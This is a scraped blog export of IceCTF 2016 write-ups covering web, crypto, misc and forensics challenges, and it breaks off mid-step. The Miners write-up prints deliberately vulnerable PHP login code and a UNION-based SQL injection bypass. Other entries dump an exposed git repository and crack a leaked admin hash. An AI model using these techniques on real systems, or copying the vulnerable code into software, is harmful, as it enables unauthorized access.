IceCTF{h3XduMp1N9_l1K3_A_r341_B14Ckh47}","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/tags/misc/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 65 - Miners! - Web","slug":"IceCTF-65-Miners-Web","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.478Z","comments":true,"path":"en/IceCTF-65-Miners-Web/","link":"","permalink":"http://rawsec.ml/en/IceCTF-65-Miners-Web/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionThe miners website has been working on adding a login portal so that all miners can get the flag, but they haven’t made any accounts! However, your boss demands the flag now! Can you get in anyway? miners.vuln.icec.tf Solution Notice that users database is empty! We have the source code: 12345678910111213141516&lt;?phpinclude \"config.php\";$con = mysqli_connect($MYSQL_HOST, $MYSQL_USER, $MYSQL_PASS, $MYSQL_DB);$username = $_POST[\"username\"];$password = $_POST[\"password\"];$query = \"SELECT * FROM users WHERE username='$username' AND password='$password'\";$result = mysqli_query($con, $query);if (mysqli_num_rows($result) !== 1) &#123; echo \"&lt;h1&gt;Login failed.&lt;/h1&gt;\";&#125; else &#123; echo \"&lt;h1&gt;Logged in!&lt;/h1&gt;\"; echo \"&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;\";&#125;?&gt; Even if DB is empty we need the SQL request to generate 1 row: mysqli_num_rows($result) !== 1. To do that we will use and UNION with a non-empty SELECT request and we’ll try to guess number of columns. Username: &#39; UNION SELECT 1,2,3 # and Password: random. Flag: IceCTF{the_miners_union_is_a_strong_one}. Note: Database is MySQL.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://rawsec.ml/tags/web/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 60 - Blue Monday - Misc","slug":"IceCTF-60-Blue-Monday-Misc","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.492Z","comments":true,"path":"en/IceCTF-60-Blue-Monday-Misc/","link":"","permalink":"http://rawsec.ml/en/IceCTF-60-Blue-Monday-Misc/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionThose who came before me lived through their vocations From the past until completion, they’ll turn away no more And still I find it so hard to say what I need to say But I’m quite sure that you’ll tell me just how I should feel today. blue_monday Solution Let’s see what this file is! 12file blue_mondayblue_monday: Standard MIDI data (format 1) using 1 track at 1/220 It’s some MIDI file, we’ve to convert it into a text format. I used this online service. That gave me: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102MFile 0 1 220MTrk0 On ch=1 n=73 v=100220 Off ch=1 n=73 v=0220 On ch=1 n=99 v=100440 Off ch=1 n=99 v=0440 On ch=1 n=101 v=100660 Off ch=1 n=101 v=0660 On ch=1 n=67 v=100880 Off ch=1 n=67 v=0880 On ch=1 n=84 v=1001100 Off ch=1 n=84 v=01100 On ch=1 n=70 v=1001320 Off ch=1 n=70 v=01320 On ch=1 n=123 v=1001540 Off ch=1 n=123 v=01540 On ch=1 n=72 v=1001760 Off ch=1 n=72 v=01760 On ch=1 n=65 v=1001980 Off ch=1 n=65 v=01980 On ch=1 n=99 v=1002200 Off ch=1 n=99 v=02200 On ch=1 n=107 v=1002420 Off ch=1 n=107 v=02420 On ch=1 n=49 v=1002640 Off ch=1 n=49 v=02640 On ch=1 n=110 v=1002860 Off ch=1 n=110 v=02860 On ch=1 n=57 v=1003080 Off ch=1 n=57 v=03080 On ch=1 n=95 v=1003300 Off ch=1 n=95 v=03300 On ch=1 n=109 v=1003520 Off ch=1 n=109 v=03520 On ch=1 n=85 v=1003740 Off ch=1 n=85 v=03740 On ch=1 n=53 v=1003960 Off ch=1 n=53 v=03960 On ch=1 n=73 v=1004180 Off ch=1 n=73 v=04180 On ch=1 n=99 v=1004400 Off ch=1 n=99 v=04400 On ch=1 n=95 v=1004620 Off ch=1 n=95 v=04620 On ch=1 n=87 v=1004840 Off ch=1 n=87 v=04840 On ch=1 n=49 v=1005060 Off ch=1 n=49 v=05060 On ch=1 n=55 v=1005280 Off ch=1 n=55 v=05280 On ch=1 n=104 v=1005500 Off ch=1 n=104 v=05500 On ch=1 n=95 v=1005720 Off ch=1 n=95 v=05720 On ch=1 n=109 v=1005940 Off ch=1 n=109 v=05940 On ch=1 n=73 v=1006160 Off ch=1 n=73 v=06160 On ch=1 n=68 v=1006380 Off ch=1 n=68 v=06380 On ch=1 n=49 v=1006600 Off ch=1 n=49 v=06600 On ch=1 n=53 v=1006820 Off ch=1 n=53 v=06820 On ch=1 n=95 v=1007040 Off ch=1 n=95 v=07040 On ch=1 n=76 v=1007260 Off ch=1 n=76 v=07260 On ch=1 n=51 v=1007480 Off ch=1 n=51 v=07480 On ch=1 n=116 v=1007700 Off ch=1 n=116 v=07700 On ch=1 n=53 v=1007920 Off ch=1 n=53 v=07920 On ch=1 n=95 v=1008140 Off ch=1 n=95 v=08140 On ch=1 n=72 v=1008360 Off ch=1 n=72 v=08360 On ch=1 n=52 v=1008580 Off ch=1 n=52 v=08580 On ch=1 n=118 v=1008800 Off ch=1 n=118 v=08800 On ch=1 n=69 v=1009020 Off ch=1 n=69 v=09020 On ch=1 n=95 v=1009240 Off ch=1 n=95 v=09240 On ch=1 n=97 v=1009460 Off ch=1 n=97 v=09460 On ch=1 n=95 v=1009680 Off ch=1 n=95 v=09680 On ch=1 n=114 v=1009900 Off ch=1 n=114 v=09900 On ch=1 n=52 v=10010120 Off ch=1 n=52 v=010120 On ch=1 n=118 v=10010340 Off ch=1 n=118 v=010340 On ch=1 n=51 v=10010560 Off ch=1 n=51 v=010560 On ch=1 n=125 v=10010780 Off ch=1 n=125 v=011780 Meta TrkEndTrkEnd Alternatively you can use midicsv that convert MIDI to CSV. It’s only up to you which file you prefer to parse. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011020, 0, Header, 1, 1, 2201, 0, Start_track1, 0, Note_on_c, 0, 73, 1001, 220, Note_off_c, 0, 73, 01, 220, Note_on_c, 0, 99, 1001, 440, Note_off_c, 0, 99, 01, 440, Note_on_c, 0, 101, 1001, 660, Note_off_c, 0, 101, 01, 660, Note_on_c, 0, 67, 1001, 880, Note_off_c, 0, 67, 01, 880, Note_on_c, 0, 84, 1001, 1100, Note_off_c, 0, 84, 01, 1100, Note_on_c, 0, 70, 1001, 1320, Note_off_c, 0, 70, 01, 1320, Note_on_c, 0, 123, 1001, 1540, Note_off_c, 0, 123, 01, 1540, Note_on_c, 0, 72, 1001, 1760, Note_off_c, 0, 72, 01, 1760, Note_on_c, 0, 65, 1001, 1980, Note_off_c, 0, 65, 01, 1980, Note_on_c, 0, 99, 1001, 2200, Note_off_c, 0, 99, 01, 2200, Note_on_c, 0, 107, 1001, 2420, Note_off_c, 0, 107, 01, 2420, Note_on_c, 0, 49, 1001, 2640, Note_off_c, 0, 49, 01, 2640, Note_on_c, 0, 110, 1001, 2860, Note_off_c, 0, 110, 01, 2860, Note_on_c, 0, 57, 1001, 3080, Note_off_c, 0, 57, 01, 3080, Note_on_c, 0, 95, 1001, 3300, Note_off_c, 0, 95, 01, 3300, Note_on_c, 0, 109, 1001, 3520, Note_off_c, 0, 109, 01, 3520, Note_on_c, 0, 85, 1001, 3740, Note_off_c, 0, 85, 01, 3740, Note_on_c, 0, 53, 1001, 3960, Note_off_c, 0, 53, 01, 3960, Note_on_c, 0, 73, 1001, 4180, Note_off_c, 0, 73, 01, 4180, Note_on_c, 0, 99, 1001, 4400, Note_off_c, 0, 99, 01, 4400, Note_on_c, 0, 95, 1001, 4620, Note_off_c, 0, 95, 01, 4620, Note_on_c, 0, 87, 1001, 4840, Note_off_c, 0, 87, 01, 4840, Note_on_c, 0, 49, 1001, 5060, Note_off_c, 0, 49, 01, 5060, Note_on_c, 0, 55, 1001, 5280, Note_off_c, 0, 55, 01, 5280, Note_on_c, 0, 104, 1001, 5500, Note_off_c, 0, 104, 01, 5500, Note_on_c, 0, 95, 1001, 5720, Note_off_c, 0, 95, 01, 5720, Note_on_c, 0, 109, 1001, 5940, Note_off_c, 0, 109, 01, 5940, Note_on_c, 0, 73, 1001, 6160, Note_off_c, 0, 73, 01, 6160, Note_on_c, 0, 68, 1001, 6380, Note_off_c, 0, 68, 01, 6380, Note_on_c, 0, 49, 1001, 6600, Note_off_c, 0, 49, 01, 6600, Note_on_c, 0, 53, 1001, 6820, Note_off_c, 0, 53, 01, 6820, Note_on_c, 0, 95, 1001, 7040, Note_off_c, 0, 95, 01, 7040, Note_on_c, 0, 76, 1001, 7260, Note_off_c, 0, 76, 01, 7260, Note_on_c, 0, 51, 1001, 7480, Note_off_c, 0, 51, 01, 7480, Note_on_c, 0, 116, 1001, 7700, Note_off_c, 0, 116, 01, 7700, Note_on_c, 0, 53, 1001, 7920, Note_off_c, 0, 53, 01, 7920, Note_on_c, 0, 95, 1001, 8140, Note_off_c, 0, 95, 01, 8140, Note_on_c, 0, 72, 1001, 8360, Note_off_c, 0, 72, 01, 8360, Note_on_c, 0, 52, 1001, 8580, Note_off_c, 0, 52, 01, 8580, Note_on_c, 0, 118, 1001, 8800, Note_off_c, 0, 118, 01, 8800, Note_on_c, 0, 69, 1001, 9020, Note_off_c, 0, 69, 01, 9020, Note_on_c, 0, 95, 1001, 9240, Note_off_c, 0, 95, 01, 9240, Note_on_c, 0, 97, 1001, 9460, Note_off_c, 0, 97, 01, 9460, Note_on_c, 0, 95, 1001, 9680, Note_off_c, 0, 95, 01, 9680, Note_on_c, 0, 114, 1001, 9900, Note_off_c, 0, 114, 01, 9900, Note_on_c, 0, 52, 1001, 10120, Note_off_c, 0, 52, 01, 10120, Note_on_c, 0, 118, 1001, 10340, Note_off_c, 0, 118, 01, 10340, Note_on_c, 0, 51, 1001, 10560, Note_off_c, 0, 51, 01, 10560, Note_on_c, 0, 125, 1001, 10780, Note_off_c, 0, 125, 01, 11780, End_track0, 0, End_of_file I used the first one because I found it’s was easier to parse. To get the flag, we need to the value of n into ASCII only for On/Note_on_c lines (or only Off/Note_off_c,) because each value is in double. Here’s my script: 12345678910111213141516import refilename = \"blue_monday_alt.txt\"binary = \"\"text = \"\"with open(filename, 'r') as fh: for line in fh: #print(line.rstrip('\\n')) if 'On' in line: regex_result = re.compile(r'n=(.*?)\\sv=').search(line) if regex_result: text += chr(int(regex_result.group(1)))print(text) And the result: 12python3 blue_monday.pyIceCTF&#123;HAck1n9_mU5Ic_W17h_mID15_L3t5_H4vE_a_r4v3&#125;","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/tags/misc/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 65 - Over the Hill - Cryptography","slug":"IceCTF-65-Over-the-Hill-Cryptography","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.522Z","comments":true,"path":"en/IceCTF-65-Over-the-Hill-Cryptography/","link":"","permalink":"http://rawsec.ml/en/IceCTF-65-Over-the-Hill-Cryptography/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionOver the hills and far away… many times I’ve gazed, many times been bitten. Many dreams come true and some have silver linings, I live for my dream of a decrypted flag. crypted Description Challenge’s title is Over the Hill like the Hill cipher polygraphic substitution. Looking for ciphering matrix in a search engine will help you find it. Since coding is own method can take some time and because dCode won’t work for Hill cipher: we will write a script using SymPy python library. Crypto examples avaible here. Install SymPy: pip install sympy. Here’s the script: 123456789101112131415161718192021from sympy.crypto.crypto import decipher_hillfrom sympy import Matrixalphabet = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789_&#123;&#125;\"matrix = [[54, 53, 28, 20, 54, 15, 12, 7], [32, 14, 24, 5, 63, 12, 50, 52], [63, 59, 40, 18, 55, 33, 17, 3], [63, 34, 5, 4, 56, 10, 53, 16], [35, 43, 45, 53, 12, 42, 35, 37], [20, 59, 42, 10, 46, 56, 12, 61], [26, 39, 27, 59, 44, 54, 23, 56], [32, 31, 56, 47, 31, 2, 29, 41]]ciphertext = \"7Nv7&#125;dI9hD9qGmP&#125;CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQ\"key = Matrix(matrix)pt = decipher_hill(ciphertext, key, alphabet)print(pt) And here’s the flag: IceCTF{linear_algebra_plus_led_zeppelin_are_a_beautiful_m1xture}.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"crypto","slug":"crypto","permalink":"http://rawsec.ml/tags/crypto/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 60 - Exposed! - Web","slug":"IceCTF-60-Exposed-Web","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.528Z","comments":true,"path":"en/IceCTF-60-Exposed-Web/","link":"","permalink":"http://rawsec.ml/en/IceCTF-60-Exposed-Web/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionJohn is pretty happy with himself, he just made his first website! He used all the hip and cool systems, like NginX, PHP and Git! Everyone is so happy for him, but can you get him to give you the flag? Solution Description tell us we’re looking for a web hosted git repository. Let’s try http://exposed.vuln.icec.tf/.git/. Oh I forgot to say! We are lazy and this tool is amazing: GitTools. Dump the git repo : ./gitdumper.sh http://exposed.vuln.icec.tf/.git/ repo. Let’s see what we get in there: 1234567891011ls -A1 repo/.git/COMMIT_EDITMSGHEADconfigdescriptionindexinfologsobjectspacked-refsrefs Let’s see COMMIT_EDITMSG: 12345678910111213141516cat .git/COMMIT_EDITMSGadd robots.txt# Please enter the commit message for your changes. Lines starting# with &apos;#&apos; will be ignored, and an empty message aborts the commit.## Author: James Sigurðarson &lt;jamiees2@gmail.com&gt;# Date: Wed Aug 10 21:47:49 2016 +0000## On branch master# Changes to be committed:# new file: robots.txt## Untracked files:# rewrite-history.sh# Interesting there is a robots.txt, we should have look to it sooner: http://exposed.vuln.icec.tf/robots.txt 123User-Agent: *Disallow: /.gitDisallow: /flag.php Oh yeah a flag.php file! Let’s go to http://exposed.vuln.icec.tf/flag.php: there is nothing anymore here. But maybe we can found an older version of flag.php with git! Want to dig into git HEAD and all? Nah! There still is GitTools. Let’s extract all now: ./extractor.sh repo/ repodump/. There is a lot of stuff in here: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798ls -RA repodumprepodump:0-60756b184c2d6b8f0247c152d8549562bc14d2d9 14-b536a10b5453686bd1dfcc50da3cb156c321fb5f 2-adf0ebdff8a972f3f6158304323feba4aa1fd482 25-631503ff237e145c7bade484c44c05a223b51155 4-cda8cc0acc8a09153351e43c40f4abeb7a823a031-6034c348380c9709715e6af60d04f684867d7234 15-e9f1db96f8b67eced8183d2d523e4ea76c008b83 20-32b31838b757a00f2e296ac198ca7d9cb930e644 26-90c2cd27cabb8ec7f55941ecee004558a070ccde 5-68162dcb661493c295f3913b1c1da2b198adfdd810-fd2ac4d5260ee06f9a0e5f4808bf3862e2065fb8 16-ec95d11bb37f00fb8e17f6bdbb800124b79e3c32 21-5ea13398f975b53ff30b7ea162b2ec6897a48c68 27-541e08f75514d1caec2a62fe3a1af308da6f35d8 6-f5674cbaacd842cfacb9f825c29f7f3e5150c7ef11-4183a0cd7143899e4a5d34f01ce58317fd68921e 17-590a15d32d9a494be5830f61c5c180ddef86e43e 22-ebe74d8641b4d8b90c33d1deb69070476b0ef402 28-4de7e6fbbba6f94bc146b33bbfe6c0155f3c2fd4 7-f521418118a088ef00fef0c3e199d30d6c7e96a512-175e312b3d3aeab77ada20ed93d1c9a3f2caf429 18-6b3e1ffdc1d679c4815f08ef1d70d1b955451b36 23-97dcb30a5862aa43984b8beee84c9477a7315856 29-bf55633224c5c76f49d42621ace07aa705ebae6e 8-584ae8349fe51e2cb25e11347003c11e92f88c7413-1746e11be489319bd8900318874b68304eb05288 19-1f601ea8a09052234b53e2cc1bb12e4ceacbf8a6 24-971c67fd8ed67c3986844f627917c19c151d00bf 3-d70b2e576c0f35e83d70027434050e06f729662b 9-672c8f636b6db9c79412db177dcca75cde27c82brepodump/0-60756b184c2d6b8f0247c152d8549562bc14d2d9:.gitignore commit-meta.txt flag.php index.phprepodump/1-6034c348380c9709715e6af60d04f684867d7234:.gitignore commit-meta.txt flag.php index.phprepodump/10-fd2ac4d5260ee06f9a0e5f4808bf3862e2065fb8:commit-meta.txt index.phprepodump/11-4183a0cd7143899e4a5d34f01ce58317fd68921e:.gitignore commit-meta.txt flag.php index.php robots.txtrepodump/12-175e312b3d3aeab77ada20ed93d1c9a3f2caf429:commit-meta.txt index.phprepodump/13-1746e11be489319bd8900318874b68304eb05288:.gitignore commit-meta.txt flag.php index.php robots.txtrepodump/14-b536a10b5453686bd1dfcc50da3cb156c321fb5f:.gitignore commit-meta.txt index.phprepodump/15-e9f1db96f8b67eced8183d2d523e4ea76c008b83:.gitignore commit-meta.txt flag.php index.php robots.txtrepodump/16-ec95d11bb37f00fb8e17f6bdbb800124b79e3c32:.gitignore commit-meta.txt index.phprepodump/17-590a15d32d9a494be5830f61c5c180ddef86e43e:.gitignore commit-meta.txt flag.php index.php robots.txtrepodump/18-6b3e1ffdc1d679c4815f08ef1d70d1b955451b36:.gitignore commit-meta.txt index.phprepodump/19-1f601ea8a09052234b53e2cc1bb12e4ceacbf8a6:.gitignore commit-meta.txt index.phprepodump/2-adf0ebdff8a972f3f6158304323feba4aa1fd482:.gitignore commit-meta.txt flag.php index.phprepodump/20-32b31838b757a00f2e296ac198ca7d9cb930e644:.gitignore commit-meta.txt flag.php flag.txt index.phprepodump/21-5ea13398f975b53ff30b7ea162b2ec6897a48c68:.gitignore commit-meta.txt flag.php index.phprepodump/22-ebe74d8641b4d8b90c33d1deb69070476b0ef402:.gitignore commit-meta.txt index.phprepodump/23-97dcb30a5862aa43984b8beee84c9477a7315856:.gitignore commit-meta.txt flag.php index.phprepodump/24-971c67fd8ed67c3986844f627917c19c151d00bf:.gitignore commit-meta.txt index.phprepodump/25-631503ff237e145c7bade484c44c05a223b51155:.gitignore commit-meta.txt flag.php index.phprepodump/26-90c2cd27cabb8ec7f55941ecee004558a070ccde:.gitignore commit-meta.txt index.phprepodump/27-541e08f75514d1caec2a62fe3a1af308da6f35d8:.gitignore commit-meta.txt flag.php flag.txt index.phprepodump/28-4de7e6fbbba6f94bc146b33bbfe6c0155f3c2fd4:.gitignore commit-meta.txt index.phprepodump/29-bf55633224c5c76f49d42621ace07aa705ebae6e:.gitignore commit-meta.txt index.phprepodump/3-d70b2e576c0f35e83d70027434050e06f729662b:.gitignore commit-meta.txt index.phprepodump/4-cda8cc0acc8a09153351e43c40f4abeb7a823a03:.gitignore commit-meta.txt index.phprepodump/5-68162dcb661493c295f3913b1c1da2b198adfdd8:.gitignore commit-meta.txt flag.php index.phprepodump/6-f5674cbaacd842cfacb9f825c29f7f3e5150c7ef:.gitignore commit-meta.txt index.phprepodump/7-f521418118a088ef00fef0c3e199d30d6c7e96a5:.gitignore commit-meta.txt index.phprepodump/8-584ae8349fe51e2cb25e11347003c11e92f88c74:.gitignore commit-meta.txt flag.php flag.txt index.phprepodump/9-672c8f636b6db9c79412db177dcca75cde27c82b:.gitignore commit-meta.txt index.php Still to lazy to dig with git? Ok let’s use grep: 123456789grep -r -i icectf&#123; repodump/repodump/20-32b31838b757a00f2e296ac198ca7d9cb930e644/flag.txt:IceCTF&#123;this_isnt_the_flag_either&#125;repodump/7-f521418118a088ef00fef0c3e199d30d6c7e96a5/index.php: font-size: 2em; /* IceCTF&#123;secure_y0ur */repodump/8-584ae8349fe51e2cb25e11347003c11e92f88c74/flag.txt:IceCTF&#123;this_isnt_the_flag_either&#125;repodump/0-60756b184c2d6b8f0247c152d8549562bc14d2d9/flag.php: echo &apos;IceCTF&#123;not_this_flag&#125;&apos;;repodump/6-f5674cbaacd842cfacb9f825c29f7f3e5150c7ef/index.php: echo &apos;Hello World! IceCTF&#123;secure_y0ur_g1t_repos_pe0ple&#125;&apos;;repodump/18-6b3e1ffdc1d679c4815f08ef1d70d1b955451b36/index.php: echo &apos;Hello World! IceCTF&#123;secure_y0ur_g1t_repos_pe0ple&#125;&apos;;repodump/27-541e08f75514d1caec2a62fe3a1af308da6f35d8/flag.txt:IceCTF&#123;this_isnt_the_flag_either&#125;repodump/23-97dcb30a5862aa43984b8beee84c9477a7315856/flag.php: echo &apos;IceCTF&#123;not_this_flag&#125;&apos;; Tada!","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://rawsec.ml/tags/web/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 70 - Kitty - Web","slug":"IceCTF-70-Kitty-Web","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.492Z","comments":true,"path":"en/IceCTF-70-Kitty-Web/","link":"","permalink":"http://rawsec.ml/en/IceCTF-70-Kitty-Web/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionThey managed to secure their website this time and moved the hashing to the server :(. We managed to leak this hash of the admin’s password though! c7e83c01ed3ef54812673569b2d79c4e1f6554ffeb27706e98c067de9ab12d1a. Can you get the flag? kitty.vuln.icec.tf Solution Try to identify the hash: 12345678910111213141516171819202122232425262728293031323334353637383940414243# hashid &quot;c7e83c01ed3ef54812673569b2d79c4e1f6554ffeb27706e98c067de9ab12d1a&quot;Analyzing &apos;c7e83c01ed3ef54812673569b2d79c4e1f6554ffeb27706e98c067de9ab12d1a&apos;[+] Snefru-256[+] SHA-256[+] RIPEMD-256[+] Haval-256[+] GOST R 34.11-94[+] GOST CryptoPro S-Box[+] SHA3-256[+] Skein-256[+] Skein-512(256)# hash-identifier ######################################################################### # __ __ __ ______ _____ # # /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ `\\ # # \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\/_/\\ \\/ \\ \\ \\/\\ \\ # # \\ \\ _ \\ /&apos;__`\\ / ,__\\ \\ \\ _ `\\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ # # \\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/ # # \\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.1 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # ######################################################################### ------------------------------------------------------------------------- HASH: c7e83c01ed3ef54812673569b2d79c4e1f6554ffeb27706e98c067de9ab12d1aPossible Hashs:[+] SHA-256[+] Haval-256Least Possible Hashs:[+] GOST R 34.11-94[+] RipeMD-256[+] SNEFRU-256[+] SHA-256(HMAC)[+] Haval-256(HMAC)[+] RipeMD-256(HMAC)[+] SNEFRU-256(HMAC)[+] SHA-256(md5($pass))[+] SHA-256(sha1($pass)) That’s most probably a SHA-256 hash. Try an online service to get the decoded password: Vo83*. Log in with Username: admin and Password: Vo83*. Flag: IceCTF{i_guess_hashing_isnt_everything_in_this_world}.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://rawsec.ml/tags/web/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 65 - R.I.P Transmission - Forensics","slug":"IceCTF-65-RIP-Transmission-Forensics","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.502Z","comments":true,"path":"en/IceCTF-65-RIP-Transmission-Forensics/","link":"","permalink":"http://rawsec.ml/en/IceCTF-65-RIP-Transmission-Forensics/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionThis seems to be recieving some sort of transmission. Our experts have been working around the clock trying and figure out what the hell it means with no hope of getting to the bottom of it. You’re our only hope. Solution Check file type: 12file riprip: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=9fd51896db8e1b47260951e8f6ca7d6023ce9ae6, not stripped Execute it: http://asciinema.org/a/276ngyyh05z80luxnqbyy95mq That’s defintly not what we’re looking for but only a lapse in concentration. Check what is hidden in this binary: 123456789101112131415binwalk ripDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 ELF, 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux)993400 0xF2878 Unix path: /usr/lib/locale/locale-archive1014524 0xF7AFC Unix path: /proc/sys/vm/overcommit_memory1024257 0xFA101 Unix path: /proc/sys/kernel/rtsig-max1025342 0xFA53E Unix path: /sysdeps/unix/sysv/linux/getcwd.c1027000 0xFABB8 Unix path: /proc/sys/kernel/osrelease1093862 0x10B0E6 Unix path: /nptl/sysdeps/unix/sysv/linux/i386/../fork.c1097017 0x10BD39 ELF, 32-bit LSB no file type, (SYSV)1100142 0x10C96E Unix path: /sysdeps/unix/sysv/linux/dl-origin.c1323949 0x1433AD Zip archive data, encrypted at least v2.0 to extract, compressed size: 112199, uncompressed size: 112190, name: rip.jpg1436306 0x15EA92 End of Zip archive We can see there is a zip with encrypted data (protected by password). Firstly we can extract this zip from the binary: 123456789101112131415161718192021222324252627foremost -t zip -i rip -T -vForemost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick MikusAudit FileForemost started at Sat Aug 20 23:01:53 2016Invocation: foremost -t zip -i rip -T -vOutput directory: /root/CTF/IceCTF/2016/65-RIP_Transmission-Forensics/output_Sat_Aug_20_23_01_53_2016Configuration file: /etc/foremost.confProcessing: rip|------------------------------------------------------------------File: ripStart: Sat Aug 20 23:01:53 2016Length: 1 MB (1698648 bytes)Num Name (bs=512) Size File Offset Commentfoundat=rip.jpgUT0: 00002585.zip 109 KB 1323949 *|Finish: Sat Aug 20 23:01:53 20161 FILES EXTRACTEDzip:= 1------------------------------------------------------------------Foremost finished at Sat Aug 20 23:01:53 2016 Secondly we can bruteforce the password with patator, I first tried with 500-worst-passwords dict and then I was successful with john dict: 